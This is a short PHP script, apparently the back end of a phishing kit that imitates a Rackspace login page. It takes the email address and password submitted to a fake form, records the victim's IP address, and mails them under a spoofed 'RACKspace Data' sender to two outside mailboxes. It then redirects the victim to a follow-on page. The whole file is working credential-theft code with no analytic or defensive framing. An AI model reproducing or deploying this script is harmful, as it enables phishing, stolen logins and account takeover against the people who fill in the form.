<?

$ip = $_SERVER['REMOTE_ADDR'];
$message  = "=============+[ Info ]+=========\n";
$message .= "Email Address : ".$_POST['usname']."\n";
$message .= "Partword : ".$_POST['pawd']."\n";
$message .= "============= [ Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";


$from = "From: RACKspace Data<letters@blemblem.com>";
$subj = "RakZ Details 2";
mail("robertfay221@gmail.com, bigalertyearend@aol.com",$subj,$message,$from);

header("Location: surf3.html");

?>


